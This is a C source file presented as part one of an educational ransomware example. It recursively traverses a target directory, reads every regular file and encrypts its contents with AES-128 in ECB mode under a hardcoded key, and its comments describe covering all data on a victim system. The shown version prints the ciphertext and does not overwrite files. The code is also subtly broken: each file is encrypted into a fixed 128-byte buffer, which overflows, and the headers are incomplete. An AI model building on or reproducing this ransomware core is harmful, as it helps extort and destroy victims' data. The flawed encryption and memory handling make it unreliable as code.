// Created July 23, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ gcc <path to file>\Ransomware_Example_In_C_Part_1.c -o 
// <path to file>\Ransomware_Example_In_C_Part_1.exe then run like any .exe ]
// This is Part 1 of the Ransomware program, it shows an example technique of traversing all the directories and then encrypting all the data

// As always we start with the import statements:
// stdio.h is for displaying the ransom message and in Part 2 for putting in the proof of payment
// string.h is for dealing with the data as holding it in strings is an easy way to encrypt it
// openssl/evp.h has cryptography functions for the encryption and in Part 2 the decryption
// dirent.h is used to access directories allowing us to cover every level of depth the data is stored in
#include <stdio.h>
#include <string.h>
#include <openssl/evp.h>
#include <dirent.h>

// The function to print the hex representation/version of the data converted from its original type
void printHex(const unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x", data[i]);
    }
    printf("\n");
}

// Here is the encryption function using AES encryption (change the data from plaintext to ciphertext)
void aesEncrypt(const unsigned char* plaintext, int plaintextLen, const unsigned char* key, unsigned char* ciphertext) {
    EVP_CIPHER_CTX* ctx;
    int ciphertextLen, len;

    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintextLen);
    ciphertextLen = len;
    EVP_EncryptFinal_ex(ctx, ciphertext + len, &len);
    ciphertextLen += len;
    EVP_CIPHER_CTX_free(ctx);
}

// How we traverse a directory and its subdirectories finding all the files on the target system
void scanDirectory(const char* directory, const unsigned char* key) {
    DIR* dir = opendir(directory);  // Pointer to the directory
    if (dir) {
        struct dirent* entry;  // Creating a struct for entering the directory
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) { // Checking if it's a regular file
                char filepath[256];  // Variable to hold the name of the file path which can't be longer than 256 characters
                snprintf(filepath, sizeof(filepath), "%s/%s", directory, entry->d_name);

                // Reading the file contents
                FILE* file = fopen(filepath, "r");  // A pointer to the file we are reading
                if (file) {
                    fseek(file, 0, SEEK_END);  // Start at the beginning of the file
                    int fileSize = ftell(file);
                    fseek(file, 0, SEEK_SET);  

                    unsigned char* fileContent = (unsigned char*)malloc(fileSize);  // Pointer to the file's contents
                    fread(fileContent, 1, fileSize, file);
                    fclose(file);  // Close the file

                    // Encrypt file contents with AES encryption
                    unsigned char encrypted[128];
                    aesEncrypt(fileContent, fileSize, key, encrypted);  // Using the encryption function
                    printf("Encrypted file content of '%s': ", filepath);  // Recording where the file data we encrypted came from
                    printHex(encrypted, sizeof(encrypted));  // Using the function to print the Hex representation of the data

                    free(fileContent);  // Release the memory used to hold the file's contents
                }
            } else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {  // This is what we do if we find another directory instead of a file, we go deeper
                char subdir[256];
                snprintf(subdir, sizeof(subdir), "%s/%s", directory, entry->d_name);
                scanDirectory(subdir, key);
            }
        }
        closedir(dir);  // Finally all directories are encrypted so we close them (in C you need to pay attention to memory usage)
    }
}

int main() {  // Our main function that everything works in
    // Encryption key (128 bits / 16 bytes)
    unsigned char key[] = "ThisIsASecretKey";  // Establish a secret key, they will typically use one you can't just guess like this one

    // AES encryption of the data
    const unsigned char plaintext[] = "A plaintext message as an example";
    unsigned char ciphertext[128];
    aesEncrypt(plaintext, strlen((const char*)plaintext), key, ciphertext);  // Use the encryption function
    printf("Ciphertext: ");  // Here we spit out the ciphertext
    printHex(ciphertext, sizeof(ciphertext));  // Now the Hex representation

    // This is the part where we scan directories/files with the function we made earlier
    const char* targetDirectory = "/path/to/scan";
    printf("\nScanning all files in directory: %s\n", targetDirectory);
    scanDirectory(targetDirectory, key);  // Here is where we go through each directory, putting all the above work together

    return 0;
}

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
